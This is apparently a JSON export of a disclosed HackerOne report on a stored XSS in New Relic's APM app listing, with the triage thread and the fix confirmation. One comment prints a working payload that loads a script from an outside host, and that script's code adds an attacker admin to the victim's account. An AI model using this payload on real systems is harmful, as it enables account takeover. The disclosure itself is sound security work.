{"id":530511,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzA1MTE=","url":"https://hackerone.com/reports/530511","title":"Stored XSS at APM applications listing","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-04-07T10:03:38.337Z","submitted_at":"2019-04-07T10:03:38.337Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skavans","url":"/skavans","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-13T10:45:15.682Z","bug_reporter_agreed_on_going_public_at":"2020-08-11T09:28:56.178Z","team_member_agreed_on_going_public_at":"2020-08-13T10:45:15.610Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello team,\n\nI have discovered that the attacker which can create APM app or modify the existing app name can cause a stored XSS firing at APM apps listing page.\n\nThere is a script like the following at the APM apps listing page:\n```javascript\nwindow.applicationData = {\"applications\":[{\"id\":304769090,\"name\":\"APPLICATION_NAME\",\"language\":\"python\",\"reporting\":true,\"last_reported_at\":\"2019-04-07T09:31:18+00:00\",\"application_summary\":{\"response_time\":0.0,\"throughput\":0.0,\"error_rate\":0.0,\"apdex_target\":0.5,\"apdex_score\":0.0,\"host_count\":1,\"instance_count\":1},\"links\":{}}]...\n```\n\nThe `name` JSON field (containing \"APPLICATION_NAME\" in my example) is sanitized, so we cannot just use the quote sign to break the JSON to execute arbitrary JS-code. But due to the template engine is used (as I think) to generate a page, if we set the application name to some HTML-tag with attributes (e.g. `\u003cimg src=x\u003e`), the template engine normalizes it and the name becomes `\u003cimg src=\"x\"\u003e` with quotes inside. So if we use the `\u003cimg src=-alert(document.domain)-\u003e` payload as app name, the resulting script looks like the following:\n```javascript\nwindow.applicationData = {\"applications\":[{\"id\":304769090,\"name\":\"\u003cimg src=\"-alert(document.domain)-\"\u003e\",\"language\":\"python\",\"reporting\":true,\n```\nand this is how the malicious code could be injected into a page and executed then.\n\n###Steps to reproduce\n1. Sign into the APM app with some account which can edit app name\n2. Go to some app settings and change its name (alias) to `\u003cimg src=-alert(document.domain)-\u003e`\n3. Navigate to APM main page (with apps listing) and make sure the alert box is popped up.\n{F463935}\n\nP.S.: The vulnerable script doesn't appear always, it works if the first created app is malicious but may not work for unknown reasons if there are some active apps at the account. If you have some troubles with reproduce the bug, please reach me and I will investigate this behavior further.\n\n## Impact\n\nAttacker which can create new apps or modify the existing one title can execute an arbitrary JS-code attacking account admin/owner. Setting up the new application through, for example, python NewRelic agent, and specifying the malicious name at `newrelic.ini` can also cause storing the XSS payload so every user knowing the license key can perform the attack.","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":463935,"file_name":"______________2019-04-07___12.57.23.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/463/935/0a98910f7af1fababa1e063a25fefd2f296e47c7/______________2019-04-07___12.57.23.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-04-07___12.57.23.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-04-07___12.57.23.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150927Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d5fea4eb133c14d5172295f8033b56b15f2f1ec2cbd43df8496f504e4c21ef83","file_size":295220,"type":"image/png"}],"allow_singular_disclosure_at":"2020-09-10T09:28:56.225Z","allow_singular_disclosure_after":-34234831.12654222,"singular_disclosure_allowed":true,"vote_count":13,"voters":["wi11","bogdantcaciuc","mik317","joaovitormaia","cr4xerbik4sh","pkhadka","vangogh001","036467383637","asteryu","ganeshdev","and 3 more..."],"severity":{"rating":"high","score":7.6,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":18678,"asset_type":"URL","asset_identifier":"rpm.newrelic.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4502306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, it definitely can be exploited by user against the admin/owner.\nThere is the PoC-video  below:\n{F464007}\n\n\nThe payload (malicious app name) used is \n**a\u003cimg src=-$.getScript(atob(`aHR0cHM6Ly94bi0tMXhhLnN1L3BheWxvYWRzL25ld2FkbWluLmpz`))-\u003e**\nwhich loads and executes the external script from `https://xn--1xa.su/payloads/newadmin.js` in fact. The script contains the following code that is used to invite malicious admin to account:\n```javascript\nvar account = document.location.pathname.split('/')[2];\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"https:\\/\\/rpm.newrelic.com\\/user_management\\/accounts\\/\" + account + \"\\/users\\/new\", true);\nxhr.setRequestHeader(\"Accept\", \"application\\/json\");\nxhr.setRequestHeader(\"Accept-Language\", \"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\");\nxhr.setRequestHeader(\"Content-Type\", \"application\\/json\");\nxhr.setRequestHeader(\"X-Requested-With\", \"XMLHttpRequest\");\nxhr.withCredentials = true;\nvar body = \"{\\\"account_view\\\":{\\\"user\\\":{\\\"full_name\\\":\\\"malicious_admin\\\",\\\"email\\\":\\\"admin@skavans.ru\\\"},\\\"level\\\":\\\"admin\\\"}}\";\nvar aBody = new Uint8Array(body.length);\nfor (var i = 0; i \u003c aBody.length; i++)\n  aBody[i] = body.charCodeAt(i); \nxhr.send(new Blob([aBody]));\n```","automated_response":false,"created_at":"2019-04-07T14:53:21.319Z","updated_at":"2019-04-07T14:53:21.319Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":464007,"filename":"newrelic_xss_at_apm_apps_list.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/464/007/8cd958ba5bd560c39a1f03ea040ce029a36d4c45/newrelic_xss_at_apm_apps_list.mp4?response-content-disposition=attachment%3B%20filename%3D%22newrelic_xss_at_apm_apps_list.mp4%22%3B%20filename%2A%3DUTF-8%27%27newrelic_xss_at_apm_apps_list.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150927Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=cd1cfb31be00acafd841b9050b46cef295f66deacb5ea2e1749043b45cfd6ede"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509815,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Wow @skavans , this is probably the simplest XSS I've seen executed against our app. Excellent find! I'm still cracking up at how easy this is.\n\nWe'll get right to this, and I'll let you know once it's resolved.","automated_response":false,"created_at":"2019-04-08T17:41:24.659Z","updated_at":"2019-04-08T17:41:24.659Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509816,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-04-08T17:41:36.455Z","updated_at":"2019-04-08T17:41:36.455Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"skavans","url":"/skavans"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4519535,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans ,\n\nInterestingly enough I'm not able to reproduce this anymore. I'm wondering if another deploy unintentionally fixed this, or if I'm just in a different application state. Can you still reproduce this?","automated_response":false,"created_at":"2019-04-09T15:58:22.163Z","updated_at":"2019-04-09T15:58:22.163Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4519625,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @dday,\n\n\u003eP.S.: The vulnerable script doesn't appear always, it works if the first created app is malicious but may not work for unknown reasons if there are some active apps at the account.\n\nI wrote about the similar behavior. You can try to reproduce this at new fresh account having no active applications â€“ this is how it worked at my case. I'll try to reproduce this too a little later, ok?","automated_response":false,"created_at":"2019-04-09T16:14:51.043Z","updated_at":"2019-04-09T16:14:51.043Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4520501,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for clarifying, @skavans ! I'll tinker around some more to see if I can still reproduce!","automated_response":false,"created_at":"2019-04-09T17:45:15.798Z","updated_at":"2019-04-09T17:45:15.798Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4521370,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dday Are you successful with reproducing this or you need my help with this?","automated_response":false,"created_at":"2019-04-09T20:23:47.481Z","updated_at":"2019-04-09T20:23:47.481Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4521600,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans ,\n\nStill having trouble. I got it to work the first time, but now trying on a new account with new apps, I can't seem to reproduce. In your screenshot, you had *only* active apps. Does that seem to be important?","automated_response":false,"created_at":"2019-04-09T20:26:44.139Z","updated_at":"2019-04-09T20:26:44.139Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4521646,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's hard to say for sure. At the video, the app is inactive. I can investigate this in about an hour.","automated_response":false,"created_at":"2019-04-09T20:33:11.931Z","updated_at":"2019-04-09T20:33:11.931Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4521783,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you!","automated_response":false,"created_at":"2019-04-09T20:59:38.445Z","updated_at":"2019-04-09T20:59:38.445Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4523282,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans !\n\nWe were able to track this down. Turns out the bug requires that the application has an error condition. We can now consistently reproduce this. \n\nThanks for the help!","automated_response":false,"created_at":"2019-04-09T21:32:52.118Z","updated_at":"2019-04-09T21:32:52.118Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4523584,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm glad to hear this! Please feel free to reach me if you need some more assistance.","automated_response":false,"created_at":"2019-04-09T21:49:47.430Z","updated_at":"2019-04-09T21:49:47.430Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4523803,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Will do! \n\n{F465614}","automated_response":false,"created_at":"2019-04-09T21:53:00.936Z","updated_at":"2019-04-09T21:53:00.936Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":465614,"filename":"guitar.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/614/83cdc593a792f77de7a67fff78f611b7783e30bf/guitar.gif?response-content-disposition=attachment%3B%20filename%3D%22guitar.gif%22%3B%20filename%2A%3DUTF-8%27%27guitar.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150927Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=108bf20483c56758f68661641afd56c4f5f8a072be1bc52c4641cd7ce6646fd4"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4567994,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans ,\n\nCan you verify that this is now resolved?","automated_response":false,"created_at":"2019-04-15T22:11:30.106Z","updated_at":"2019-04-15T22:11:30.106Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4569423,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @dday,\nIt seems the vulnerability is fixed.\n\nThe vulnerable script now looks like\n```html\nwindow.applicationData = {\"applications\":[{\"id\":306633125,\"name\":\"\u0026lt;img src=-alert(document.domain)-\u0026gt;\"\n```\n\nSo the tags are not parsed now and there are no quotes breaking the JSON added.","automated_response":false,"created_at":"2019-04-16T07:08:11.219Z","updated_at":"2019-04-16T07:08:11.219Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4575390,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If I change the app name (alias) through app settings, the resulting script is:\n```javascript\nwindow.applicationData = {\"applications\":[{\"id\":277507324,\"name\":\"\u003cimg src=-alert(document.domain)-\u003e\"\n```\nIf I add new app with malicious name through NR agent, the resulting script is like at my previous comment:\n```javascript\nwindow.applicationData = {\"applications\":[{\"id\":306633125,\"name\":\"\u0026lt;img src=-alert(document.domain)-\u0026gt;\"\n```\n\nSo yes, it seems to be fixed ;)\n","automated_response":false,"created_at":"2019-04-16T14:42:30.555Z","updated_at":"2019-04-16T14:42:30.555Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4621404,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @skavans,\n\nThank you for confirming this issue is corrected! We will close this as Resolved.","automated_response":false,"created_at":"2019-04-22T21:39:44.185Z","updated_at":"2019-04-22T21:39:44.185Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skavans","url":"/skavans"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8902488,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-11T09:28:56.198Z","updated_at":"2020-08-11T09:28:56.198Z","first_to_agree":true,"actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8923215,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can we disclose this?","automated_response":false,"created_at":"2020-08-13T08:31:22.321Z","updated_at":"2020-08-13T08:31:22.321Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8924605,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-13T10:45:15.630Z","updated_at":"2020-08-13T10:45:15.630Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8924606,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-13T10:45:15.705Z","updated_at":"2020-08-13T10:45:15.705Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e